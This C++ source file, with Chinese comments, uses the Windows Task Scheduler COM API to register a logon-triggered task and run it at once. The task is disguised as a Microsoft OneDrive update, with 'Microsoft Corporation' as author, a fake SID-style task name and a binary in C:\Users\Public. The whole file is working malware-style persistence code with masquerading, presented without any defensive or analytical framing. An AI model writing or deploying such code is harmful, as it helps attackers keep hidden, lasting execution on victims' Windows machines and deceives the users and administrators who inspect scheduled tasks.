#include <stdio.h>
#include <windows.h>
#include <comutil.h>
#include <taskschd.h>
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "taskschd.lib")

DWORD CreateScheduledTask(WCHAR* TaskAuthor, WCHAR* TaskName, WCHAR* wstrExePath) {
	HRESULT hr = S_OK;

	//  初始化COM库
	hr = ::CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if ((hr != S_OK) && hr != S_FALSE)
	{
		::wprintf(L"[-] CoInitializeEx has failed\n");
		return 0;
	}
	else if (hr == S_FALSE)
	{
		::wprintf(L"[*] COM library has been already initialized\n");
	}

	//  设置安全信息
	PSECURITY_DESCRIPTOR pSecDesc = { 0 };
	hr = ::CoInitializeSecurity(pSecDesc,
		-1,
		NULL,
		NULL,
		RPC_C_AUTHN_LEVEL_PKT,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		NULL,
		0,
		NULL);
	if (hr != S_OK)
	{
		::wprintf(L"[-] CoInitializeSecurity has failed\n");
		::CoUninitialize();
		return 0;
	}

	//  创建特定CLSID的对象
	ITaskService* pService = NULL;
	hr = ::CoCreateInstance(CLSID_TaskScheduler,
		NULL,
		CLSCTX_INPROC_SERVER,
		IID_ITaskService,
		(void**)&pService);
	if (hr != S_OK)
	{
		::wprintf(L"[-] CoCreateInstance has failed\n");
		::CoUninitialize();
		return 0;
	}

	//  连接到计划任务服务
	hr = pService->Connect(VARIANT(), VARIANT(), VARIANT(), VARIANT());
	if (FAILED(hr))
	{
		::wprintf(L"[-] ITaskService::Connect has failed\n");
		pService->Release();
		::CoUninitialize();
		return 0;
	}

	//  获取任务的根目录
	ITaskFolder* pRootFolder = NULL;
	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	if (FAILED(hr))
	{
		::wprintf(L"[-] ITaskService::GetFolder has failed\n");
		pService->Release();
		::CoUninitialize();
		return 0;
	}

	//  创建任务建立器对象，用于创建计划任务对象
	ITaskDefinition* pTask = NULL;
	hr = pService->NewTask(0, &pTask);
	pService->Release();
	if (FAILED(hr))
	{
		::wprintf(L"[-] ITaskService::NewTask has failed\n");
		::CoUninitialize();
		return 0;
	}

	//  设置标识符
	IRegistrationInfo* pRegInfo = NULL;
	hr = pTask->get_RegistrationInfo(&pRegInfo);
	if (FAILED(hr))
	{
		::wprintf(L"[-] get_RegistrationInfo has failed\n");
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}

	//  设置创建者名称
	hr = pRegInfo->put_Author(_bstr_t(TaskAuthor));
	pRegInfo->Release();
	if (FAILED(hr))
	{
		::wprintf(L"[-] put_Author has failed\n");
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}

	//  指定任务运行时的身份和权限
	IPrincipal* pPrincipal = NULL;
	hr = pTask->get_Principal(&pPrincipal);
	if (FAILED(hr))
	{
		::wprintf(L"[-] get_Principal has failed\n");
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}
	hr = pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
	pPrincipal->Release();
	if (FAILED(hr))
	{
		::wprintf(L"[-] put_LogonType has failed\n");
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}

	//  指定触发器集合
	ITriggerCollection* pTriggerCollection = NULL;
	hr = pTask->get_Triggers(&pTriggerCollection);
	if (FAILED(hr))
	{
		::wprintf(L"[-] get_Triggers has failed\n");
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}

	//  创建登录触发器（TASK_TRIGGER_LOGON）
	ITrigger* pTrigger = NULL;
	hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
	pTriggerCollection->Release();
	if (FAILED(hr))
	{
		::wprintf(L"[-] Trigger Create has failed\n");
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}

	//  将通用触发器接口转换为登录触发器接口
	ILogonTrigger* pLogonTrigger = NULL;
	hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
	pTrigger->Release();
	if (FAILED(hr))
	{
		::wprintf(L"[-] QueryInterface for ILogonTrigger has failed\n");
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}

	//  为触发器设置ID
	hr = pLogonTrigger->put_Id(_bstr_t(L"LogonTriggerId"));
	if (FAILED(hr))
	{
		::wprintf(L"[-] Trigger put_Id has failed\n");
	}

	//  可选：设置特定用户登录时触发（如果不设置，则任何用户登录都会触发）
	//  获取当前用户名
	WCHAR username[256];
	DWORD usernameLen = 256;
	if (GetUserNameW(username, &usernameLen))
	{
		hr = pLogonTrigger->put_UserId(_bstr_t(username));
		if (SUCCEEDED(hr))
		{
			::wprintf(L"[+] Task will trigger on logon for user: %s\n", username);
		}
	}
	// 如果想让任何用户登录都触发，注释掉上面的代码即可

	//  可选：设置延迟启动（登录后延迟一段时间再执行）
	// hr = pLogonTrigger->put_Delay(_bstr_t(L"PT30S")); // 延迟30秒

	pLogonTrigger->Release();

	//  设置计划任务动作为执行程序
	IActionCollection* pActionCollection = NULL;
	hr = pTask->get_Actions(&pActionCollection);
	if (FAILED(hr))
	{
		::wprintf(L"[-] get_Actions has failed\n");
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}

	IAction* pAction = NULL;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	pActionCollection->Release();
	if (FAILED(hr))
	{
		::wprintf(L"[-] Create action has failed\n");
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}

	//  设置计划任务具体执行什么程序
	IExecAction* pExecAction = NULL;
	hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	pAction->Release();
	if (FAILED(hr))
	{
		::wprintf(L"[-] QueryInterface action has failed\n");
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}

	hr = pExecAction->put_Path(_bstr_t(wstrExePath));
	pExecAction->Release();
	if (FAILED(hr))
	{
		::wprintf(L"[-] put_Path has failed\n");
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}

	//  注册任务
	IRegisteredTask* pRegisteredTask = NULL;
	hr = pRootFolder->RegisterTaskDefinition(_bstr_t(TaskName),
		pTask,
		TASK_CREATE_OR_UPDATE,
		_variant_t(),
		_variant_t(),
		TASK_LOGON_INTERACTIVE_TOKEN,
		_variant_t(L""),
		&pRegisteredTask);
	if (FAILED(hr))
	{
		::wprintf(L"[-] RegisterTaskDefinition has failed, error: 0x%08X\n", hr);
		pRootFolder->Release();
		pTask->Release();
		::CoUninitialize();
		return 0;
	}
	else //  任务注册成功后，立即执行
	{
		::wprintf(L"[+] Scheduled task has been created\n");

		IRunningTask* pRunningTask = NULL;
		hr = pRegisteredTask->Run(_variant_t(), &pRunningTask);
		if (FAILED(hr))
		{
			wprintf(L"[-] IRunningTask Failed, error: 0x%08X\n", hr);
		}
		else
		{
			wprintf(L"[+] Task has been executed immediately\n");
			if (pRunningTask)
			{
				pRunningTask->Release();
			}
		}
	}

	//  关闭COM库
	pRootFolder->Release();
	pTask->Release();
	pRegisteredTask->Release();
	::CoUninitialize();

	return 1;
}

int main()
{
	WCHAR TaskAuthor[] = L"Microsoft Corporation";
	WCHAR TaskName[] = L"OneDrive Standalone Update Task-S-1-5-21-4162225321-4122752593-2322023677-001";
	WCHAR path[] = L"C:\\Users\\Public\\OneDrive.exe";
	DWORD res_sch = CreateScheduledTask(TaskAuthor, TaskName, path);

	return 0;
}